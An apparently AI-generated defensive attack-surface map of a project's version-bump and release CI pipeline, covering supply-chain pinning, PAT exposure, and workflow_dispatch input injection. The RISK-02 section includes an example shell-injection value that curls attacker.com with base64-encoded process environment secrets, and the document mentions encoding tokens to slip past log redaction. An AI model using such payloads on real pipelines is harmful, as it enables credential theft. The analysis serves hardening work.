---
title: "Attack Surface Map: Jerry Version-Bump CI/CD Pipeline"
agent: red-recon
scope: version-bump.yml, release.yml, version bounded context
technique_refs:
  - T1592 (Gather Victim Host Information)
  - T1596 (Search Open Technical Databases / PyPI)
  - T1590 (Gather Victim Network Information - trust boundaries)
authorization: Repository owner (geekatron/jerry) - defensive security analysis
date: 2026-03-09
classification: INTERNAL - DEFENSIVE USE ONLY
---

# Attack Surface Map: Jerry Version-Bump CI/CD Pipeline

## Document Sections

| Section | Purpose |
|---------|---------|
| [L0 Executive Summary](#l0-executive-summary) | High-level risk picture for stakeholders |
| [L1 Technical Detail](#l1-technical-detail) | Full enumeration of components, inputs, and trust levels |
| [L2 Strategic Implications](#l2-strategic-implications) | Prioritized vectors, defensive recommendations |

---

## L0 Executive Summary

The Jerry version-bump pipeline (`version-bump.yml` + `release.yml`) presents a **medium-to-high attack surface** for a small open-source project. The pipeline holds a Personal Access Token (PAT) capable of bypassing branch protection and pushing directly to `main`. The most credible threat paths are:

1. **Supply chain compromise of `bump-my-version` on PyPI** -- unversioned `uv tool install bump-my-version` means a malicious PyPI upload executes arbitrary code inside a runner that holds the PAT.
2. **Collaborator-level abuse of `workflow_dispatch`** -- anyone with push access can manually trigger a major/minor/patch bump with no additional approval gate.
3. **Commit message injection into `release.yml` release notes** -- git commit subjects flow into the GitHub Release body without sanitization.

Three components have zero identified vulnerabilities given current design: the `jerry ci detect-bump-type` subprocess call (uses `shell=False`), the infinite-loop guard (`github.actor` check post-BUG-003), and the concurrency lock.

**Overall pipeline threat level: MEDIUM** (no direct RCE path for external contributors; credible paths require PyPI compromise or collaborator access).

---

## L1 Technical Detail

### 1. Component Inventory

| Component | File | Trust Level | Notes |
|-----------|------|-------------|-------|
| Workflow trigger: `push` to `main` | `version-bump.yml:14` | GitHub-controlled | Only commits merged to `main` trigger this |
| Workflow trigger: `workflow_dispatch` | `version-bump.yml:15-28` | Collaborator-controlled | Accepts `bump_type` (choice) and `prerelease` (free string) |
| `actions/checkout@v5` | Both workflows | GitHub Actions ecosystem | Fetches full history (`fetch-depth: 0`) with PAT |
| `astral-sh/setup-uv@v5` | `version-bump.yml:67` | Trusted third-party action | Pinned to `v5` tag -- NOT commit SHA |
| `uv tool install bump-my-version` | `version-bump.yml:75` | PyPI ecosystem -- UNVERSIONED | No version pin; resolves latest at runtime |
| `uv sync --frozen` | `version-bump.yml:83` | Lock file controlled | Frozen flag prevents re-resolution -- correct |
| `jerry ci detect-bump-type --since-tag` | `version-bump.yml:101` | Project-controlled | Runs project Python code inside runner |
| `bump-my-version bump "$BUMP_TYPE"` | `version-bump.yml:145` | Controlled by step output | BUMP_TYPE sourced from prior step output -- not raw user input |
| `grep -oP 'version = "\K[^"]+' pyproject.toml` | `version-bump.yml:143,166` | Filesystem read | No injection vector; reads committed file |
| `git push origin main --follow-tags` | `version-bump.yml:176` | PAT-authenticated | Pushes directly to `main` with branch protection bypass |
| `softprops/action-gh-release@v2` | `release.yml:253` | Third-party action | Pinned to `v2` tag -- NOT commit SHA |
| `pip install ... pyright` + `pip install -e ".[dev,test]"` | `release.yml:83-84` | PyPI ecosystem -- VERSIONED for some, not all | `ruff==0.14.11` pinned; `pyright` unpinned |
| `python scripts/sync_versions.py --check` | Both workflows | Project-controlled | Pure read/regex on committed files |
| `secrets.VERSION_BUMP_PAT` | `version-bump.yml:61` | GitHub Secrets -- highest trust | PAT with `contents: write` on protected branch |
| `secrets.GITHUB_TOKEN` | `release.yml:265` | Default GITHUB_TOKEN | Scoped to `contents: write` for release creation |
| Release notes generation | `release.yml:205-248` | Git commit history | Writes commit subjects into release body |

---

### 2. Trust Boundaries

```
TRUST BOUNDARY MAP

[External Contributor / PR only]
     |
     | -- cannot trigger version-bump.yml directly
     | -- can craft commit messages merged by maintainer
     | -- can submit malicious code to PyPI (if bump-my-version maintainer)
     |
[Collaborator / push access to main]
     |
     | -- can trigger workflow_dispatch with any bump_type + prerelease string
     | -- can push commits with crafted conventional commit messages
     | -- can modify workflow files (changing permissions, adding exfil steps)
     |
[GitHub Actions Runner / workflow execution context]
     |
     | -- holds VERSION_BUMP_PAT in env (checkout step)
     | -- runs arbitrary Python from uv tool install (bump-my-version)
     | -- runs arbitrary Python from uv sync --frozen (project deps)
     | -- executes git push to main
     |
[PyPI ecosystem / third-party]
     |
     | -- supplies bump-my-version at UNVERSIONED latest
     | -- supplies pyright at UNVERSIONED latest (release.yml)
     |
[GitHub ecosystem / action marketplace]
     |
     | -- supplies actions/checkout@v5 (tag pin, not SHA)
     | -- supplies astral-sh/setup-uv@v5 (tag pin, not SHA)
     | -- supplies softprops/action-gh-release@v2 (tag pin, not SHA)
```

**Key boundary violation risk:** The runner holds the PAT during the entire `bump` job. Any code executing in that job (including pip/uv-installed packages) has access to the PAT via environment variable inspection or GitHub Actions context introspection.

---

### 3. Input Enumeration

| Input | Source | Attacker-Controlled? | Current Sanitization |
|-------|--------|---------------------|----------------------|
| `github.event.head_commit.message` | GitHub -- commit on `main` | Indirectly (collaborator) | Checked for `[skip-bump]` only |
| `github.actor` | GitHub -- authenticated identity | No | Used correctly as identity (BUG-003 fix) |
| `github.event.inputs.bump_type` | Workflow dispatch | Collaborator (choice enum) | Constrained to: patch/minor/major |
| `github.event.inputs.prerelease` | Workflow dispatch | Collaborator (free string) | No validation in workflow; passed to `bump-my-version` |
| `steps.bump.outputs.type` | Step output from `detect-bump-type` | Indirectly (via commits) | Constrained to: none/patch/minor/major |
| `steps.bump.outputs.prerelease` | Step output or dispatch input | Collaborator | Interpolated into `bump-my-version bump pre_l --new-version` |
| `steps.version.outputs.version` | `grep` on `pyproject.toml` | Indirectly (via bump) | Used only in echo/summary output |
| `needs.validate.outputs.version` | Tag extraction (`GITHUB_REF`) | Collaborator (tag push) | Regex-validated against `X.Y.Z(-suffix)?` |
| Git commit subjects | Git history | Collaborator push | NOT sanitized before inclusion in release notes |
| `PREV_TAG` / git range | `git describe` | Collaborator (tag push) | No validation; used in `git log` command |

---

### 4. Specific Risk Analysis

#### RISK-01: Unversioned `bump-my-version` (Supply Chain) -- THREAT LEVEL: HIGH

**Mechanism:** `uv tool install bump-my-version` resolves the latest available version from PyPI at workflow execution time. If a threat actor with PyPI account access (or who typosquats the package name) publishes a malicious version, it executes inside the runner with access to `VERSION_BUMP_PAT`.

**What an attacker gains:** The PAT has `contents: write` on a protected branch. A compromised `bump-my-version` could exfiltrate the token, push backdoored code to `main`, or create tags that trigger `release.yml` to publish a compromised release archive.

**ATT&CK ref:** T1195.001 (Supply Chain Compromise: Compromise Software Dependencies and Development Tools)

**Current mitigations:** None. No version pin, no hash verification.

**Recommended fix:** `uv tool install 'bump-my-version==<exact_version>'`

---

#### RISK-02: `workflow_dispatch` `prerelease` Input -- THREAT LEVEL: MEDIUM

**Mechanism:** The `prerelease` input is a free-form string (line 26: `type: string`, no validation). It is interpolated directly into a shell command at line 143:

```yaml
bump-my-version bump pre_l --no-commit --no-tag --new-version "$(grep -oP 'version = "\K[^"]+' pyproject.toml | head -1)-${PRERELEASE}.1"
```

**Exploitation scenario:** A collaborator supplies `prerelease` as `alpha" && curl https://attacker.com/$(cat /proc/1/environ | base64) && echo "` (shell injection within the double-quoted version string). This is partially mitigated because `PRERELEASE` is expanded inside double quotes within `$()` subshell context. However, the pattern `"-${PRERELEASE}.1"` expands `$PRERELEASE` inside double quotes, and if `PRERELEASE` contains `$(...)`, bash will evaluate it (command substitution is not disabled by quoting in this context).

**Actual exploitability:** Requires collaborator (push/dispatch) access. Not accessible to external contributors. Severity is reduced but not zero.

**ATT&CK ref:** T1059.004 (Command and Scripting Interpreter: Unix Shell)

**Recommended fix:** Add explicit validation gate: `if [[ ! "$PRERELEASE" =~ ^[a-zA-Z0-9]+$ ]]; then echo "::error::Invalid prerelease label"; exit 1; fi`

---

#### RISK-03: Third-Party Actions Pinned to Tags, Not SHAs -- THREAT LEVEL: MEDIUM

**Mechanism:** All three third-party actions (`actions/checkout@v5`, `astral-sh/setup-uv@v5`, `softprops/action-gh-release@v2`) are pinned to mutable version tags, not immutable commit SHAs. If a maintainer's account is compromised or a malicious tag is force-pushed, the runner executes updated (potentially malicious) action code.

**What an attacker gains:** `actions/checkout@v5` runs before the PAT is used but configures git credentials. `astral-sh/setup-uv@v5` runs with full runner access. Either could intercept or log the PAT.

**ATT&CK ref:** T1195.001 (Supply Chain Compromise)

**Recommended fix:** Pin to full SHA, e.g., `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v5`

---

#### RISK-04: Commit Message Injection into Release Notes -- THREAT LEVEL: LOW-MEDIUM

**Mechanism:** In `release.yml:213`, commit subjects are extracted with:

```bash
NOTES=$(git log $PREV_TAG..HEAD --pretty=format:"- %s (%h)" --no-merges | head -50)
```

Then appended directly to `release-notes.md` (line 235: `echo "$NOTES" >> release-notes.md`). This content becomes the GitHub Release body. A collaborator can craft commit subjects containing GitHub Markdown that renders as misleading content in the release notes (e.g., fake security warnings, malicious links, or social engineering content targeting users who download the release).

**ATT&CK ref:** T1036 (Masquerading)

**Severity note:** This is a reputational/social engineering risk rather than a technical exploitation path. The release notes are displayed to end users who may trust and act on them.

**Recommended fix:** Either sanitize commit subjects (strip markdown special chars) or use GitHub's auto-generated release notes feature instead of custom git log formatting.

---

#### RISK-05: PAT Token Exposure in Runner Environment -- THREAT LEVEL: LOW (by design, residual risk)

**Mechanism:** `secrets.VERSION_BUMP_PAT` is injected as the `token` parameter of `actions/checkout@v5`. This configures git credentials and makes the token available to the git credential helper for the lifetime of the job. Any step executing code in the same job (including `bump-my-version`, project dependencies installed via `uv sync`, and `scripts/sync_versions.py`) runs in the same process environment.

**GitHub's protection:** GitHub automatically redacts known secret values from logs. However, this protection is bypassed if the token is base64-encoded, URL-encoded, or split across multiple log lines before exfiltration.

**Current mitigations:** `uv sync --frozen` limits dependency installation to the committed lockfile (good). The PAT is not explicitly echoed anywhere in the workflow.

**ATT&CK ref:** T1552.001 (Unsecured Credentials: Credentials In Files -- process environment)

---

#### RISK-06: `git push` to `main` Without Post-Push Verification -- THREAT LEVEL: LOW

**Mechanism:** The workflow pushes directly to `main` (bypassing branch protection via the PAT) without verifying that the pushed state matches the expected state. A race condition exists if another workflow or actor pushes between the checkout and the version bump push.

**Impact:** Low. The concurrency lock (`concurrency: group: version-bump, cancel-in-progress: false`) prevents concurrent bump jobs. The primary risk is a failed push being silently ignored (but `git push` will exit non-zero on conflict, which fails the job).

---

### 5. `jerry ci detect-bump-type` -- Security Assessment

The `git_commit_log_reader.py` implementation uses `subprocess.run(cmd, shell=False)` with a list argument (not a string). Arguments (`git_range`, tag names) are passed as list elements, not interpolated into a shell command string. This correctly prevents shell injection.

The `_COMMIT_PATTERN` regex is anchored (`^...$`) with no nested quantifiers. No ReDoS risk identified.

The `--since-tag` flag resolves to `__latest__` sentinel or a specific tag string. The tag string is passed as a list element to `git log`, not interpolated.

**Assessment:** No injection vulnerabilities identified in this component.

---

### 6. `release.yml` Secondary Surface

| Finding | Location | Risk |
|---------|----------|------|
| `pip install` used (not `uv`) | Lines 81-84 | Consistency risk; `pyright` is unpinned |
| `uv sync` without `--frozen` | Line 62 | Lock file may be modified during release validation |
| Version extraction via unquoted variable | Line 39: `VERSION=${{ steps.version.outputs.version }}` | If version contains special chars, unquoted expansion in conditional could behave unexpectedly |
| Archive includes `.claude` directory | Line 124: `cp -r .claude dist/` | Ships all agent definitions and rules to end users (intended, but worth noting as info disclosure) |

---

## L2 Strategic Implications

### Prioritized Defensive Actions

| Priority | Action | Addresses | Effort |
|----------|--------|-----------|--------|
| P1 | Pin `bump-my-version` to exact version + add hash check | RISK-01 (HIGH) | Low -- one-line change |
| P2 | Pin all three third-party actions to commit SHAs | RISK-03 (MEDIUM) | Low -- lookup 3 SHAs |
| P3 | Add `prerelease` input validation (alphanumeric only) | RISK-02 (MEDIUM) | Low -- add 3-line guard |
| P4 | Quote `VERSION` variable in release.yml step 39 | release.yml secondary | Trivial |
| P5 | Add `--frozen` to the `uv sync` in release.yml validate step | release.yml secondary | Trivial |
| P6 | Sanitize commit subjects before writing to release notes | RISK-04 (LOW-MEDIUM) | Medium |

### Recommended Hardening for `prerelease` Input (P3 -- exact fix)

In the "Determine bump type" step, add before the `prerelease` variable is used:

```bash
if [[ -n "$PRERELEASE" ]] && [[ ! "$PRERELEASE" =~ ^[a-zA-Z0-9]+$ ]]; then
  echo "::error::Invalid prerelease label '$PRERELEASE'. Must be alphanumeric only."
  exit 1
fi
```

### Threat Intelligence for eng-architect (Integration Point 1)

For threat modeling (STRIDE/DREAD) of the release pipeline, the primary threat actors and their capabilities are:

| Actor | Access Level | Highest Credible Impact | DREAD Score (rough) |
|-------|-------------|------------------------|---------------------|
| External contributor (PR) | Indirect (merged commit subjects only) | Misleading release notes | 3/10 |
| Collaborator (push access) | Direct workflow dispatch, push to main | Shell injection via prerelease, bump type manipulation | 6/10 |
| Compromised PyPI package | Code execution in runner | PAT exfiltration, malicious release artifacts | 8/10 |
| Compromised GitHub Action | Code execution in runner (checkout/setup-uv) | PAT exfiltration | 7/10 |

The supply chain path (RISK-01, P1 fix) is the highest-priority hardening because it is the only path where an external actor (without collaborator access) can achieve code execution in the runner context that holds the PAT.

### What Downstream Agents Should Examine

- **red-vuln / eng-devsecops:** Validate that the `VERSION_BUMP_PAT` has the minimum required scopes (should be `contents: write` on this repo only, not org-wide).
- **eng-devsecops:** Implement GitHub Actions secret scanning to detect accidental PAT log output.
- **eng-architect:** Consider splitting the PAT into two tokens -- one for the version bump commit (write to `main`) and one for tag push -- to implement least-privilege on the token itself.

---

## Methodology Notes

**Reconnaissance technique:** Passive source review of workflow files and Python source (T1592, T1596 analogues in CI context). No active scanning performed.

**Tool validation status:** All findings are based on direct source code analysis. No automated scanning tools (Semgrep, Trivy, Dependabot) were run -- manual verification of each finding recommended before actioning.

**Confidence:** HIGH for RISK-01 (direct evidence: no version pin). HIGH for RISK-02 (direct evidence: free-string interpolation pattern). MEDIUM for RISK-03 (tag pin vs SHA -- standard GitHub hardening guidance). MEDIUM for RISK-04 (Markdown injection in release notes -- indirect user impact).

---

*Agent: red-recon v1.0.0*
*Engagement: PROJ-030-bugs defensive security analysis*
*ATT&CK Phase: TA0043 Reconnaissance -- passive source analysis*
*Output Level: L0 (Executive Summary) + L1 (Technical Detail) + L2 (Strategic Implications)*
